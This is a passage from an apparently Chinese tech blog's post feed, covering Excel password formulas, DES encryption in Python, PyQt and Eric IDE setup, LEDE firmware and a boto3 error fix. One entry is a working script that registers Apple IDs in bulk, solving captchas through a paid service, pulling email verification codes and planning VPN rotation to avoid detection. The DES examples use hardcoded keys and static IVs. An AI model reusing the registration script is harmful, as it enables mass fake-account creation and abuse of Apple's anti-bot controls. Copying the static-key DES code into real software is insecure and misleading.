ND()*9+48,RAND()*25+65,RAND()*25+97)))) 随机1位小写字母：1=CHAR(INT(RAND()*26)+97) 随机1位大写字母：1=CHAR(INT(RAND()*26)+65) 随机1位大小写混合字母：1=CHAR(INT(RAND()*26)+if(INT(RAND()*2)=0,65,97)) 产生随机的10位数的大小写混合字母和数字混合：1=CONCATENATE(IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97)))),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*9+48)),IF(INT(RAND()*2)=0,CHAR(INT(RAND()*25+65)),CHAR(INT(RAND()*25+97))))) 1=CONCATENATE(IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90))),IF(ROUND(RAND(),0),CHAR(RANDBETWEEN(48,57)),CHAR(RANDBETWEEN(65,90)))) QQ群：397745473]]></content>
      <categories>
        <category>excel</category>
      </categories>
      <tags>
        <tag>excel</tag>
        <tag>生成密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyDes库 实现python的des加密,注册机]]></title>
    <url>%2F2017%2F05%2F22%2F20_pyDes%E5%BA%93%E5%AE%9E%E7%8E%B0python%E7%9A%84des%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[pyDes库 实现python的des加密,注册机QQ群：397745473 下载及简介地址：https://twhiteman.netfirms.com/des.html 如需要在python中使用des加密，可以直接使用pyDes库加密，该库提供了CBC和ECB两种加密方式。 1、Windows下安装 下载后pyDes-x.x.x.zip并解压后，里面有setup.py文件，使用命令 setup.py –help可查看详细使用。 你可以使用命令 python setup.py install 命令安装，也可以直接将压缩包内的pyDes.py拷贝到本地的python lib库下直接开始使用 2、 使用 使用参数如下（拷贝自上述提供的地址）： 123456789101112131415161718192021222324252627282930313233Class initialization--------------------pyDes.des(key, [mode], [IV], [pad], [padmode])pyDes.triple_des(key, [mode], [IV], [pad], [padmode])key -&gt; Bytes containing the encryption key. 8 bytes for DES, 16 or 24 bytes for Triple DESmode -&gt; Optional argument for encryption type, can be either pyDes.ECB (Electronic Code Book) or pyDes.CBC (Cypher Block Chaining)IV -&gt; Optional Initial Value bytes, must be supplied if using CBC mode. Length must be 8 bytes.pad -&gt; Optional argument, set the pad character (PAD_NORMAL) to use during all encrypt/decrpt operations done with this instance.padmode -&gt; Optional argument, set the padding mode (PAD_NORMAL or PAD_PKCS5) to use during all encrypt/decrpt operations done with this instance.I recommend to use PAD_PKCS5 padding, as then you never need to worry about anypadding issues, as the padding can be removed unambiguously upon decryptingdata that was encrypted using PAD_PKCS5 padmode.Common methods--------------encrypt(data, [pad], [padmode])decrypt(data, [pad], [padmode])data -&gt; Bytes to be encrypted/decryptedpad -&gt; Optional argument. Only when using padmode of PAD_NORMAL. For encryption, adds this characters to the end of the data block when data is not a multiple of 8 bytes. For decryption, will remove the trailing characters that match this pad character from the last 8 bytes of the unencrypted data block.padmode -&gt; Optional argument, set the padding mode, must be one of PAD_NORMAL or PAD_PKCS5). Defaults to PAD_NORMAL 使用实例:1234567891011121314Example-------from pyDes import *# For Python3, you‘ll need to use bytes, i.e.:# data = b&quot;Please encrypt my data&quot;# k = des(b&quot;DESCRYPT&quot;, CBC, b&quot;\0\0\0\0\0\0\0\0&quot;, pad=None, padmode=PAD_PKCS5)data = &quot;Please encrypt my data&quot;k = des(&quot;DESCRYPT&quot;, CBC, &quot;\0\0\0\0\0\0\0\0&quot;, pad=None, padmode=PAD_PKCS5)d = k.encrypt(data)print &quot;Encrypted: %r&quot; % dprint &quot;Decrypted: %r&quot; % k.decrypt(d)assert k.decrypt(d, padmode=PAD_PKCS5) == dat 以下是本人使用的例子,使用CBC加密的方式：123456789101112import base64from pyDes import *Des_Key = &quot;BHC#@*UM&quot; # KeyDes_IV = &quot;\x22\x33\x35\x81\xBC\x38\x5A\xE7&quot; # 自定IV向量def DesEncrypt(str): k = des(Des_Key, CBC, Des_IV, pad=None, padmode=PAD_PKCS5) EncryptStr = k.encrypt(str) return base64.b64encode(EncryptStr) #转base64编码返回 Python DES 加密解密，就是大家所谓想要的那个非常快速的方法这个要借助Crypto.Cipher这个插件来实现的，引用后只需要写如下代码即可123456789101112131415161718192021222324252627282930313233343536from Crypto.Cipher import DESclass MyDESCrypt: key = chr(11)+chr(11)+chr(11)+chr(11)+chr(11)+chr(11)+chr(11)+chr(11) iv = chr(22)+chr(22)+chr(22)+chr(22)+chr(22)+chr(22)+chr(22)+chr(22) def __init__(self,key=&apos;&apos;,iv=&apos;&apos;): if len(key)&gt; 0: self.key = key if len(iv)&gt;0 : self.iv = iv def ecrypt(self,ecryptText): try: cipherX = DES.new(self.key, DES.MODE_CBC, self.iv) pad = 8 - len(ecryptText) % 8 padStr = &quot;&quot; for i in range(pad): padStr = padStr + chr(pad) ecryptText = ecryptText + padStr x = cipherX.encrypt(ecryptText) return x.encode(&apos;hex_codec&apos;).upper() except: return &quot;&quot; def decrypt(self,decryptText): try: cipherX = DES.new(self.key, DES.MODE_CBC, self.iv) str = decryptText.decode(&apos;hex_codec&apos;) y = cipherX.decrypt(str) return y[0:ord(y[len(y)-1])*-1] except: return &quot;&quot; QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pyDes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyqt开发记录]]></title>
    <url>%2F2017%2F05%2F22%2F30_python%E7%94%A8pyqt%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[pyqt开发记录QQ群：397745473 提示:QInputDialog is not defined123456789---------------------------eric6 - eric6---------------------------&lt;p&gt;The debugged program raised the exception &lt;b&gt;unhandled NameError&lt;/b&gt;&lt;br&gt;&quot;&lt;b&gt;global name &amp;#x27;QInputDialog&amp;#x27; is not defined&lt;/b&gt;&quot;&lt;br&gt;File: &lt;b&gt;E:\python\register\pyqt\001\client.py&lt;/b&gt;, Line: &lt;b&gt;131&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Break here?&lt;/p&gt;---------------------------&amp;Yes &amp;No --------------------------- 解决方法:12345from PyQt4.QtCore import *from PyQt4.QtGui import *user_key, ok = self.QInputDialog.getText(self, u&apos;提示标题&apos;, u&apos;请输入参数:&apos;, self.QLineEdit.Normal, u&apos;框内内容&apos;) print unicode(user_key) 这样就能正常弹出框来了 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pyqt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lede 固件]]></title>
    <url>%2F2017%2F05%2F15%2F18_lede_%E5%9B%BA%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[QQ群：397745473官方地址:https://lede-project.org/zh/start lede 刷固件 LEDE（Linux Embedded Development Environment，Linux嵌入式开发环境）项目是一个基于OpenWrt的Linux操作系统。它完全可以替代广泛的网络设备和非网络设备中的原厂固件。 硬件列表（Table of Hardware） 列出了支持的设备。 前往 关于LEDE 以了解更多LEDE机构的信息。 LEDE相比制造商的原厂固件更加出色，才使得人们更倾向于使用LEDE。LEDE工作起来更加稳定、提供更多的功能，并且更加安全，同时具有良好的技术支持。 可扩展性： LEDE提供了许多以往只在高端设备上才提供的各种功能。它具有3000个以上的标准化应用软件包，您可以轻松地将他们应用于各种支持的设备，包括各种陈旧的路由器。 更多…高安全性： 从安装开始，LEDE就以安全的标准来设计。例如Wi-Fi默认禁用，没有弱密码，没有任何后门程序。LEDE的系统组件始终保持最新，因此漏洞一旦被发现后会很快得到解决。 更多…高性能、高稳定性 LEDE固件是由所支持的所有设备的标准化组件制作而成。这意味着每个组件都会接受更多的测试和bug修复，而不像原厂固件那样一旦为生产线的产品提供固件后就不闻不问。 更多…强大的社区支持： LEDE团队成员会经常参与到LEDE论坛、LEDE开发者、LEDE管理员以及LEDE的IRC频道中去。您可以直接与开发人员，管理软件模块的志愿者和其他LEDE用户交流，大大增加您解决问题的机会。 更多…研发： 许多团队使用LEDE作为他们对网络性能研究的平台。这意味着他们的成功实验案例将会首先在LEDE中实现，而原厂固件将会滞后许多。更多…开源/无额外支出： 使用LEDE没有任何金钱成本。它完全是由志愿者团队、开发者、维护人员、个人以及一些公司创建的。 如果您喜欢LEDE，可以考虑将它变得更好。作为开源社区的一部分，LEDE由强大的Linux Kernel驱动 获取源代码…。以及更多… 不妨看看 使用LEDE的理由…LEDE需要你! QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>lede</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[批量注册apple id的脚本]]></title>
    <url>%2F2017%2F05%2F10%2F15_python%E6%89%B9%E9%87%8F%E6%B3%A8%E5%86%8Capple_id%2F</url>
    <content type="text"><![CDATA[批量注册apple id的脚本这里只作python技术研究.无法实践利用.更多期待后续更新.待改进： 1、支持多种邮箱注册，或者尝试自己搭建一个邮件服务器。 2、注册一批后自动切换vpn。 3、日志细化，注册结果分到2个csv文件。 待实现：自动激活apple id功能。QQ群：coding=utf-8import requestsimport timeimport jsonimport base64from StringIO import StringIOfrom PIL import Imagefrom mail_util import MailReceiverimport lz_apiimport poplibimport loggingimport logging.configimport csvimport utilsimport common_headerimport sysreload(sys)sys.setdefaultencoding(&apos;utf-8&apos;)# apple 会话sessionsession = None# 请求超时时间，秒default_timeout = 30# apple返回的responsecur_rsp = None# 当前注册账号的数据cur_data = None# 验证码captcha_result = Noneverify_code = Noneverification_id = None# 尝试获取邮件次数email_try_times = 20# 获取邮件延时，秒fetch_email_delay = 5# 邮件发送时间 string 2016-07-14 20:20:20send_email_time = None# logginglogging.config.fileConfig(&quot;file/logging.conf&quot;)log = logging.getLogger(&quot;apple&quot;)# 验证码图片captcha_path = &quot;file/apple_captcha.jpg&quot;# 待注册账号account_file = &quot;file/apple_account.csv&quot;# 注册结果result_file = &quot;file/result.csv&quot;class AppleRequest(object): def get_url(self): pass def get_payload(self): pass def get_header(self): pass def request(self): pass def process(self): pass def process_status_error(self): pass def do_request(self): log.info(&quot;request: %s&quot;, self.get_url()) global cur_rsp cur_rsp = self.request() if not cur_rsp.ok: self.process_status_error() raise Exception(&quot;status code:&quot; + str(cur_rsp.status_code) + &quot;, info:&quot; + cur_rsp.text) self.process()class RegisterPageRequest(AppleRequest): &quot;&quot;&quot;step1: 打开注册页面, http get&quot;&quot;&quot; def get_url(self): return &quot;https://appleid.apple.com/#!&amp;page=create&quot; def get_header(self): return common_header.get_home_header() def request(self): return session.get(self.get_url(), headers=self.get_header(), timeout=default_timeout)class GetAccountRequest(AppleRequest): &quot;&quot;&quot;step2: 获取注册资料信息 ajax get&quot;&quot;&quot; def get_url(self): return &quot;https://appleid.apple.com/account&quot; def get_header(self): return common_header.combine_request_header(cur_rsp) def request(self): return session.get(self.get_url(), headers=self.get_header(), timeout=default_timeout)class GetCaptchaRequest(AppleRequest): &quot;&quot;&quot;step3: 获取验证码图片，解析验证码 ajax post&quot;&quot;&quot; def get_url(self): return &quot;https://appleid.apple.com/captcha&quot; def get_payload(self): return &#123;&quot;type&quot;: &quot;IMAGE&quot;&#125; def get_header(self): return common_header.combine_request_header(cur_rsp) def request(self): return session.post(self.get_url(), data=json.dumps(self.get_payload()), headers=self.get_header(), timeout=default_timeout) def process(self): self.save_captcha() self.parse_captcha() def save_captcha(self): captcha_json = cur_rsp.json() image_data = captcha_json[&quot;payload&quot;][&quot;content&quot;] img_io = StringIO() base64.decode(StringIO(image_data), img_io) captcha_img = Image.open(img_io) captcha_img.save(captcha_path) img_io.close() log.info(&quot;save captcha image done!&quot;) def parse_captcha(self): log.info(&quot;parsing captcha image...&quot;) result = lz_api.postCaptcha(captcha_path) log.info(&quot;captcha result: %s&quot;, result) global captcha_result captcha_result = json.loads(result) if not captcha_result[&quot;result&quot;]: raise Exception(&quot;lz parse captcha failed.&quot; + result)class AnswerCaptchaRequest(AppleRequest): &quot;&quot;&quot;step4: 校验图片验证码，拉取邮箱验证码 ajax post&quot;&quot;&quot; def get_url(self): return &quot;https://appleid.apple.com/account/verification&quot; def get_payload(self): captcha_json = cur_rsp.json() return &#123; &quot;account&quot;: &#123; &quot;name&quot;: cur_data[&quot;name&quot;], &quot;person&quot;: &#123; &quot;name&quot;: &#123; &quot;firstName&quot;: cur_data[&quot;firstName&quot;], &quot;lastName&quot;: cur_data[&quot;lastName&quot;] &#125; &#125; &#125;, &quot;captcha&quot;: &#123; &quot;answer&quot;: captcha_result[&quot;data&quot;][&quot;val&quot;], &quot;id&quot;: captcha_json[&quot;id&quot;], &quot;token&quot;: captcha_json[&quot;token&quot;] &#125; &#125; def get_header(self): return common_header.combine_request_header(cur_rsp) def request(self): global send_email_time send_email_time = utils.get_cur_time_str() return session.post(self.get_url(), data=json.dumps(self.get_payload()), headers=self.get_header(), timeout=default_timeout) def process_status_error(self): error_info = cur_rsp.json() for item in error_info[&quot;validationErrors&quot;]: if item[&quot;code&quot;] == &quot;captchaAnswer.Invalid&quot;: log.info(&quot;post captcha error to lz&quot;) lz_api.postError(captcha_result[&quot;data&quot;][&quot;id&quot;]) break def process(self): global verification_id verification_id = cur_rsp.json()[&quot;verificationId&quot;] log.info(&quot;the captcha is correct, try to get the email code&quot;) self.get_mail_code() def get_mail_code(self): config = &#123; &quot;account&quot;: cur_data[&quot;name&quot;], &quot;pwd&quot;: cur_data[&quot;emailPwd&quot;], &quot;host&quot;: &quot;pop.139.com&quot;, &quot;port&quot;: 110 &#125; global verify_code global email_try_times global fetch_email_delay global send_email_time try_times = email_try_times email_code = None log.info(&quot;waiting %d seconds for fetch the email code&quot;, fetch_email_delay) while try_times &gt; 0: try: time.sleep(fetch_email_delay) log.info(&quot;try...%d&quot;, try_times) receiver = MailReceiver(config).initialize() count = receiver.get_mail_count() if count &gt; 0: mail = receiver.get_mail(count) content = &quot;,&quot;.join(mail) is_apple_mail = utils.is_apple_mail(content) if is_apple_mail: email_code = utils.find_apple_code(content, send_email_time) if email_code is not None: verify_code = email_code log.info(&quot;got it! %s&quot;, verify_code) break receiver.quit() except poplib.error_proto, e: log.error(str(e).decode(&quot;gb2312&quot;)) except Exception, e: log.error(e) finally: try_times -= 1 if email_code is None: raise Exception(&quot;can not find email code&quot;)class EmailVerificationRequest(AppleRequest): &quot;&quot;&quot;step5: 校验邮箱验证码 ajax put&quot;&quot;&quot; def get_url(self): return &quot;https://appleid.apple.com/account/verification/&quot; def get_payload(self): return &#123; &quot;name&quot;: cur_data[&quot;name&quot;], &quot;verificationInfo&quot;: &#123; &quot;id&quot;: verification_id, &quot;answer&quot;: verify_code &#125; &#125; def get_header(self): return common_header.combine_request_header(cur_rsp) def request(self): return session.put(self.get_url(), data=json.dumps(self.get_payload()), headers=self.get_header(), timeout=default_timeout)class RegisterRequest(AppleRequest): &quot;&quot;&quot;step6: 校验都成功后发送用户注册的信息 ajax post&quot;&quot;&quot; def get_url(self): return &quot;https://appleid.apple.com/account&quot; def get_payload(self): return &#123; &quot;account&quot;: &#123; &quot;name&quot;: cur_data[&quot;name&quot;], &quot;password&quot;: cur_data[&quot;applePwd&quot;], &quot;person&quot;: &#123; &quot;birthday&quot;: cur_data[&quot;birthday&quot;], &quot;name&quot;: &#123; &quot;firstName&quot;: cur_data[&quot;firstName&quot;], &quot;lastName&quot;: cur_data[&quot;lastName&quot;] &#125;, &quot;primaryAddress&quot;: &#123; &quot;country&quot;: &quot;CHN&quot; &#125; &#125;, &quot;preferences&quot;: &#123; &quot;preferredLanguage&quot;: &quot;zh_CN&quot;, &quot;marketingPreferences&quot;: &#123; &quot;appleNews&quot;: False, &quot;appleUpdates&quot;: True, &quot;iTunesUpdates&quot;: True &#125; &#125;, &quot;security&quot;: &#123; &quot;questions&quot;: [ &#123; &quot;answer&quot;: cur_data[&quot;question1Answer&quot;], &quot;id&quot;: cur_data[&quot;question1Id&quot;], &quot;question&quot;: cur_data[&quot;question1&quot;] &#125;, &#123; &quot;answer&quot;: cur_data[&quot;question2Answer&quot;], &quot;id&quot;: cur_data[&quot;question2Id&quot;], &quot;question&quot;: cur_data[&quot;question2&quot;] &#125;, &#123; &quot;answer&quot;: cur_data[&quot;question3Answer&quot;], &quot;id&quot;: cur_data[&quot;question3Id&quot;], &quot;question&quot;: cur_data[&quot;question3&quot;] &#125; ] &#125;, &quot;verificationInfo&quot;: &#123; &quot;id&quot;: verification_id, &quot;answer&quot;: verify_code &#125; &#125; &#125; def get_header(self): return common_header.combine_request_header(cur_rsp) def request(self): return session.post(self.get_url(), data=json.dumps(self.get_payload()), headers=self.get_header(), timeout=default_timeout) def process(self): log.info(&quot;successfully!&quot;)handlers = [ RegisterPageRequest(), GetAccountRequest(), GetCaptchaRequest(), AnswerCaptchaRequest(), EmailVerificationRequest(), RegisterRequest()]log.info(&quot;========================Start:%s======================&quot;, utils.get_cur_time_str())with open(account_file, &quot;r&quot;) as r, open(result_file, &quot;ab&quot;) as w: reader = csv.reader(r) writer = csv.writer(w) line = 0 for row in reader: row = [cell.decode(&quot;gbk&quot;) for cell in row] line += 1 if line == 1: row.insert(0, &quot;errorInfo&quot;) row.insert(0, &quot;status&quot;) writer.writerow(row) continue try: cur_data = utils.wrap_data(row) log.info(&quot;------------seq: %d, account: %s--------------&quot;, line, cur_data[&quot;name&quot;]) session = requests.session() for handler in handlers: handler.do_request() row.insert(0, &quot;&quot;) row.insert(0, &quot;ok&quot;) # switch vpn time.sleep(3) except Exception, ex: row.insert(0, ex) row.insert(0, &quot;error&quot;) log.exception(&quot;got an exception&quot;) finally: log.info(&quot;-----------------------------------------------------------&quot;) writer.writerow(row) session.close()log.info(&quot;========================End:%s======================&quot;, utils.get_cur_time_str()) QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用aws亚马逊的boto3报错解决办法]]></title>
    <url>%2F2017%2F05%2F10%2F16_python%E4%BD%BF%E7%94%A8aws%E4%BA%9A%E9%A9%AC%E9%80%8A%E7%9A%84boto3%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[使用aws亚马逊的boto3报错解决办法QQ群：397745473 12345678910111213141516171819202122232425C:\Python27\python.exe D:/python/test_boto3.pyTraceback (most recent call last): File &quot;D:/python/test_boto3.py&quot;, line 5, in &lt;module&gt; client = boto3.client(&apos;ses&apos;) File &quot;C:\Python27\lib\site-packages\boto3\__init__.py&quot;, line 83, in client return _get_default_session().client(*args, **kwargs) File &quot;C:\Python27\lib\site-packages\boto3\session.py&quot;, line 263, in client aws_session_token=aws_session_token, config=config) File &quot;C:\Python27\lib\site-packages\botocore\session.py&quot;, line 836, in create_client client_config=config, api_version=api_version) File &quot;C:\Python27\lib\site-packages\botocore\client.py&quot;, line 70, in create_client verify, credentials, scoped_config, client_config, endpoint_bridge) File &quot;C:\Python27\lib\site-packages\botocore\client.py&quot;, line 224, in _get_client_args verify, credentials, scoped_config, client_config, endpoint_bridge) File &quot;C:\Python27\lib\site-packages\botocore\args.py&quot;, line 45, in get_client_args endpoint_url, is_secure, scoped_config) File &quot;C:\Python27\lib\site-packages\botocore\args.py&quot;, line 103, in compute_client_args service_name, region_name, endpoint_url, is_secure) File &quot;C:\Python27\lib\site-packages\botocore\client.py&quot;, line 297, in resolve service_name, region_name) File &quot;C:\Python27\lib\site-packages\botocore\regions.py&quot;, line 122, in construct_endpoint partition, service_name, region_name) File &quot;C:\Python27\lib\site-packages\botocore\regions.py&quot;, line 135, in _endpoint_for_partition raise NoRegionError()botocore.exceptions.NoRegionError: You must specify a region. 报上面的错误,原因我是没有配置文件.按官方文档在C:\Users\Administrator.aws建立两个文件就可以了.credentialsconfig 注意:.aws必须要有点,windows直接建不出来.可以用cmd建.1mkdir \.aws QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyqt环境搭建]]></title>
    <url>%2F2017%2F05%2F10%2F17_pyqt%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[pyqt环境搭建QQ群：397745473 python 版本选择.选择python 2.x python 开发的easy 模式原生的idle并不好用.可以选用ipython,支持自动补全.自动缩进,支持bash shell内部很多有用的功能和函数. pythonxy集成python 科技计算包.如numpy,matplotlib,spyder缺点:现在更新比较慢了. python EPD商业版本,不建议用 Anaconda建议使用内部很多新版本的科学计算包,由python之父维护.安装前卸载其他python解释器下载地址:https://www.continuum.io/downloads/装完后再去pyqt官网下载一个重新安装pyqt.这样才能编译成功.安装ERIC4 F2运行安装 Eric4首次运行需配置环境 eclipse + pydev安装jdk,java运行环境在eclipse中安装pydev1.去官网下载eclipse2.安装Pydev输入网址,选第一个勾上就行了.配置python解释器路径 布局器的使用垂直布局横向布局网格布局窗体布局 lebel控件主要目的是为了显示信息,可以发射信号 环境搭建1.卸载掉其他的python环境.2.下载Anaconda2,下载地址:https://repo.continuum.io/archive/Anaconda2-4.3.1-Windows-x86_64.exe建议到网官下载最新版本,如果速度慢可以使用迅雷或者先下载到网盘里再用客户端下载,这样速度比较快.双击:E:\BaiduYunDownload\Anaconda2-4.3.1-Windows-x86_64.exe安装路:d:\Anaconda2其他的默认就好了 3.重新下载并安装pyqt到pyqt官网上下一个再装一遍,把Anaconda2不太好用的这个覆盖掉.https://sourceforge.net/projects/pyqt/files/PyQt4/http://sourceforge.net/projects/pyqt/files/PyQt4/PyQt-4.11.4/PyQt4-4.11.4-gpl-Py2.7-Qt4.8.7-x32.exe这里需要注意找对版本.比如我的用的是python 2.7,64位的系统,就需要找2.7的版本. 下载Eric6:https://sourceforge.net/projects/eric-ide/files/latest/downloadhttps://sourceforge.net/projects/eric-ide/files/latest/downloadhttp://netix.dl.sourceforge.net/project/eric-ide/eric6/stable/6.1.4/eric6-6.1.4.zip4.将eric6-6.1.4.zip解压，找到install.py, 双击会自动安装Eric 问题解决错误提示信息:123456789101112131415161718C:\TDDownload\PyQt4_gpl_win-4.12&gt;python D:\Anaconda2\eric6-17.05\eric\eric6.pyError in sys.excepthook:Traceback (most recent call last): File &quot;D:\Anaconda2\eric6-17.05\eric\eric6.py&quot;, line 149, in excepthook import Utilities File &quot;D:\Anaconda2\eric6-17.05\eric\Utilities\__init__.py&quot;, line 62, in &lt;module&gt; from PyQt5.Qsci import QSCINTILLA_VERSION_STR, QsciScintillaImportError: No module named QsciOriginal exception was:Traceback (most recent call last): File &quot;D:\Anaconda2\eric6-17.05\eric\eric6.py&quot;, line 377, in &lt;module&gt; main() File &quot;D:\Anaconda2\eric6-17.05\eric\eric6.py&quot;, line 268, in main if not Globals.checkBlacklistedVersions(): File &quot;D:\Anaconda2\eric6-17.05\eric\Globals\__init__.py&quot;, line 112, in checkBlacklistedVersions from PyQt5.Qsci import QSCINTILLA_VERSION_STRImportError: No module named Qsci 这是因为pyqt装的版本不对.所以就会出现上面的错误,重新安装正确的版本就解决了. 这里还有可能碰到一个问题：总是报Qsci没有安装。经过测试很多次。发现了。先装个最新版的3.5pyqt,再卸载掉。再装上面的这个就没有问题了。 提示如下信息为正常:1234567891011121314151617181920212223242526272829C:\Users\vsyour&gt;python D:\Anaconda2\eric6-6.1.4\install.pyChecking dependenciesPython Version: 2.7.13Found PyQt4Found pyuic4Found QScintilla2Found QtGuiFound QtNetworkFound QtSqlFound QtSvgQt Version: 4.8.7sip Version: 4.16.8PyQt Version: 4.11.4QScintilla Version: 2.9All dependencies ok.Cleaning up old installation ...Creating configuration file ...Compiling user interface files ...Compiling source files ...Installing eric6 ...Installation complete.Press enter to continue... 配置: 执行 install.py1.API处选python,并编译一下. 2.自动补全3.自动补全的下一项点击from….. pyqt使用笔记加入槽函数. 测试提示信息12my_button=QMessageBox.information(self,&apos;infomation&apos;,u&apos;提示信息&apos;,)my_button=QMessageBox.information(self, u&apos;提示信息框&apos;, u&apos;提示内容&apos;,) 1.加入”pushButton_8”2.点保存.3.编译.4.加入槽函数.选择”on_pushButton_8_clicked”事件 12from PyQt4.QtCore import *from PyQt4.QtGui import * 在py执行文件的头部加入消息提示包,不然会报错的.5.加入上面的代码,执行测试. 询问框12my_button=QMessageBox.question(self, u&apos;询问框标题&apos;, u&apos;询问内容&apos;, )my_button=QMessageBox.question(self, u&apos;询问框标题&apos;, u&apos;询问内容&apos;, &apos;OK&apos;,&apos;cancel&apos;,u&apos;我也不知道&apos;) 警告信息123my_button=QMessageBox.warning(self, u&apos;警告提示框&apos;, u&apos;警告内容&apos;)my_button=QMessageBox.warning(self, u&apos;警告提示框&apos;, u&apos;警告内容&apos;, &apos;ok&apos;, &apos;cancel&apos;, &apos;nonono&apos;)print my_button 严重警告对话框1my_button=QMessageBox.critical(self, u&apos;严重警告&apos;, u&apos;严重警告内容!&apos;, u&apos;操作1&apos;, u&apos;操作2&apos;, u&apos;操作3&apos;) 测试发现这个操作最多是3个,多了就会报错了. 关于对话框1my_button=QMessageBox.about(self, u&apos;关于标题&apos;, u&apos;关于内容&apos;) about QT1my_button=QMessageBox.aboutQT(self, u&apos;aboutQT&apos;) 16.运行时获取用户输入，弹出一个界面（上）获取字符串123my_str, ok=QInputDialog.getText(self, u&apos;提示标题&apos;, u&apos;请输入参数:&apos;,QLineEdit.Normal, u&apos;框内内容&apos;) print unicode(my_str) print ok 获取整数123my_str, ok=QInputDialog.getInteger(self, u&apos;提示标题&apos;, u&apos;请输入整数:&apos;,30, 0, 100) print unicode(my_str) print ok 下拉框123456789101112131415161718@pyqtSignature(&quot;&quot;)def on_pushButton_15_clicked(self): &quot;&quot;&quot; Slot documentation goes here. &quot;&quot;&quot; # TODO: not implemented yet my_list=QStringList() my_list.append(u&apos;选择1&apos;) my_list.append(u&apos;选择2&apos;) my_list.append(u&apos;选择3&apos;) my_list.append(u&apos;选择4&apos;) my_list.append(u&apos;选择5&apos;) my_list.append(u&apos;选择6&apos;) my_str, ok=QInputDialog.getItem(self, u&apos;提示标题&apos;, u&apos;提示内容&apos;, my_list) self.textBrowser.append(unicode(my_str) ) print unicode(my_str) print ok 定制对话框需要先建立一个Ui,把内容放到原来的里面就行了.注意:记得要把下面这句给复制上,不然弹不出来.其他的就没什么需要注意的了1from Ui_001 import Ui_Dialog 图片控件1.拖入”graphicsView”控制2.把资源添加到资源浏览器中3.点控件,右键,编辑样式表–点添加资源右边的小三角–选中间那个(第一个是加背景图片,第二个是可伸缩的,第三个是按原图大小显示)4.生成py文件.点击resource–add resource–再编译一下 这里需要注意的是加资源的时候路径不要有中文 .不然会编译不成功 实现点击图片打开网站1.在MainWindow中加入一个自定义的槽函数2.1self.graphicsView.mousePressEvent=self.my_clicked 3.导入webbrowser包1import webbrowser 实现这个点击的方法123def my_clicked(self, e): print &apos;chicked!&apos; webbrowser.open(&apos;http://www.baidu.com&apos;) 更改图片的显示使用lable显示图片只需要在点击事件里更改对应标签的属性就行了.如:1self.graphicsView.setStyleSheet(_fromUtf8(&quot;border-image: url(:/pic/543ba83533fa828b4292640bfd1f4134960a5aaf.jpg);&quot;)) 20.启动界面，来个炫酷的出场加一个图片资源..可以转到pycharm中去操作了.eric主要用来做UI的编辑 python程序打包用pyinstaller打包建议到32位电脑上打包1.打包成文件夹 执行:pyinstaller xxx.py2.打包成单个文件 执行:pyinstaller -F 